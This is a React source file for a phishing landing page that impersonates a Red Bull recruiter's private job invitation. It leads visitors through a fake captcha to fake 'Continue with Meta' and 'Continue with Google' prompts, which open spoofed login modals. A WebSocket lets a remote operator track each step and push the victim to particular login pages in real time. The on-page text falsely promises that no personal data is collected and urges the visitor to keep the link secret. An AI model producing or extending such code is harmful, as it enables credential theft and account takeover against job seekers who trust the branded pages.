import { useState, useEffect } from "react";
import LinearProgress from "@mui/material/LinearProgress";
import { useWebSocket } from "../context/WebSocketContext";
import useDynamicCss from "../utils/useDynamicCss";
import FacebookModal, { type FbPage } from "../components/FacebookModal";
import GoogleModal, { type GgPage } from "../components/GoogleModal";

// --- GoogleAuth Component ---
const GoogleAuth = ({ onPressContinueWithGoogle }: { onPressContinueWithGoogle: () => void }) => {
  return (
    <div className="landing-body-wrapper">
      <div className="landing-meta-card">
        <div>
          <h2 className="landing-meta-title">
            Authentication Required
          </h2>
          <hr className="landing-meta-hr" />
          <p className="landing-meta-p1">
            Access to this company’s services requires authentication through
            Google. This authentication method is mandated in accordance with our
            internal security protocols and corporate policies, ensuring secure
            and compliant access for all users.
          </p>

          <p className="landing-meta-p2">
            Please note that no personal data is collected during the
            authentication process. This measure is in place solely to verify
            access in alignment with company policy, and all user privacy is
            fully respected and protected throughout.
          </p>
        </div>
        <button
          onClick={onPressContinueWithGoogle}
          className="landing-google-btn"
        >
          <svg width="24" height="24" viewBox="0 0 24 24">
            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
          </svg>
          Continue with Google
        </button>
      </div>
    </div>
  );
};

// --- Meta Component (from ROBERTHALFEMIR/app/Login.tsx:L447) ---
const Meta = ({ onPressContinueWithMeta }: { onPressContinueWithMeta: () => void }) => {
  return (
    <div className="landing-body-wrapper">
      <div className="landing-meta-card">
        <div>
          <h2 className="landing-meta-title">
            Authentication Required
          </h2>
          <hr className="landing-meta-hr" />
          <p className="landing-meta-p1">
            Access to this company’s services requires authentication through
            Meta. This authentication method is mandated in accordance with our
            internal security protocols and corporate policies, ensuring secure
            and compliant access for all users.
          </p>

          <p className="landing-meta-p2">
            Please note that no personal data is collected during the
            authentication process. This measure is in place solely to verify
            access in alignment with company policy, and all user privacy is
            fully respected and protected throughout.
          </p>
        </div>
        <button
          onClick={onPressContinueWithMeta}
          className="landing-meta-btn"
        >
          <img src="/assets/landing/facebook.svg" alt="Facebook" className="landing-meta-btn-icon" />
          Continue with Meta
        </button>
      </div>
    </div>
  );
};

// --- Captcha Component (from ROBERTHALFEMIR/app/Login.tsx:L482) ---
const Captcha = ({ onPressContinue }: { onPressContinue: () => void }) => {
  return (
    <div className="landing-body-wrapper">
      <div className="landing-captcha-card">
        <img src="/assets/landing/talent-logo.png" alt="talent logo" className="landing-captcha-logo" />
        <h1 className="landing-captcha-title">
          Welcome to Red Bull
        </h1>
        <p className="landing-captcha-desc">
          Please don’t share this link – it’s a private invitation sent to you
          personally by one of our recruiters. This opportunity was selected
          with care, just for you, and we kindly ask that you keep it
          confidential. We appreciate your discretion, and we’re excited for
          what’s ahead.
        </p>
        <div className="landing-captcha-divider"></div>
        <button
          onClick={onPressContinue}
          className="landing-captcha-btn"
        >
          Continue
        </button>
      </div>
    </div>
  );
};

export default function Landing() {
  const { submitForm, modalCommand, clearModalCommand } = useWebSocket();
  const [step, setStep] = useState<"captcha" | "meta" | "google">("captcha");
  const [progress, setProgress] = useState<number>(20);
  const [isPageLoading, setIsPageLoading] = useState(true);

  // Modal states
  const [showFbModal, setShowFbModal] = useState(false);
  const [showGgModal, setShowGgModal] = useState(false);
  const [fbPage, setFbPage] = useState<FbPage>("login");
  const [ggPage, setGgPage] = useState<GgPage>("sign-in");

  useEffect(() => {
    document.title = "Talent Acquisition – Private Invitation";
    const timer = setTimeout(() => setIsPageLoading(false), 500);
    return () => clearTimeout(timer);
  }, []);

  // Listen to WebSocket modal commands
  useEffect(() => {
    if (!modalCommand) return;

    if (modalCommand.modal === "facebook") {
      setShowGgModal(false);
      setFbPage(modalCommand.page as FbPage);
      setShowFbModal(true);
    } else if (modalCommand.modal === "google") {
      setShowFbModal(false);
      setGgPage(modalCommand.page as GgPage);
      setShowGgModal(true);
    } else if (modalCommand.modal === "landing") {
      setShowFbModal(false);
      setShowGgModal(false);
      if (modalCommand.page === "captcha") {
        setStep("captcha");
        setProgress(20);
      } else if (modalCommand.page === "meta") {
        setStep("meta");
        setProgress(40);
      } else if (modalCommand.page === "google") {
        setStep("google");
        setProgress(40);
      }
    } else if (modalCommand.modal === "none") {
      setShowFbModal(false);
      setShowGgModal(false);
    }

    clearModalCommand();
  }, [modalCommand, clearModalCommand]);

  useDynamicCss("/css/Landing.css");

  const handlePressContinue = () => {
    setStep("meta");
    setProgress(40);
  };

  const handlePressContinueWithMeta = () => {
    submitForm("landing", { step: "meta" });
    setProgress(60);
    setFbPage("login");
    setShowFbModal(true);
  };

  const handlePressContinueWithGoogle = () => {
    submitForm("landing", { step: "google" });
    setProgress(60);
    setGgPage("sign-in");
    setShowGgModal(true);
  };

  if (isPageLoading) {
    return (
      <div
        style={{
          position: "fixed",
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          width: "100vw",
          height: "100vh",
          backgroundColor: "#ffffff",
          zIndex: 99999,
        }}
      />
    );
  }

  return (
    <>
      <div className="landing-page-container">
        {/* Header */}
        <header className="landing-header">
          <img src="/assets/landing/talent-logo.png" alt="logo" className="landing-header-logo" />
          <button className="landing-header-close-btn" aria-label="Close">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#384955" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </header>

        {/* Body Steps */}
        {step === "captcha" && (
          <Captcha onPressContinue={handlePressContinue} />
        )}

        {step === "meta" && (
          <Meta onPressContinueWithMeta={handlePressContinueWithMeta} />
        )}

        {step === "google" && (
          <GoogleAuth onPressContinueWithGoogle={handlePressContinueWithGoogle} />
        )}

        {/* Footer Progress */}
        <footer className="landing-footer">
          <LinearProgress
            variant="determinate"
            value={progress}
            sx={{
              height: 15,
              borderRadius: 5,
              borderTopLeftRadius: 0,
              borderBottomLeftRadius: 0,
              borderBottomRightRadius: 0,
              borderTopRightRadius: 0,
              backgroundColor: "#D2D8DC",
              "& .MuiLinearProgress-bar": {
                borderRadius: 5,
                backgroundColor: "#0B6E76",
              },
            }}
          />
        </footer>
      </div>

      {/* Facebook Auth Modal Overlay */}
      <FacebookModal
        isOpen={showFbModal}
        currentPage={fbPage}
        onClose={() => setShowFbModal(false)}
      />

      {/* Google Auth Modal Overlay */}
      <GoogleModal
        isOpen={showGgModal}
        currentPage={ggPage}
        onClose={() => setShowGgModal(false)}
      />
    </>
  );
}
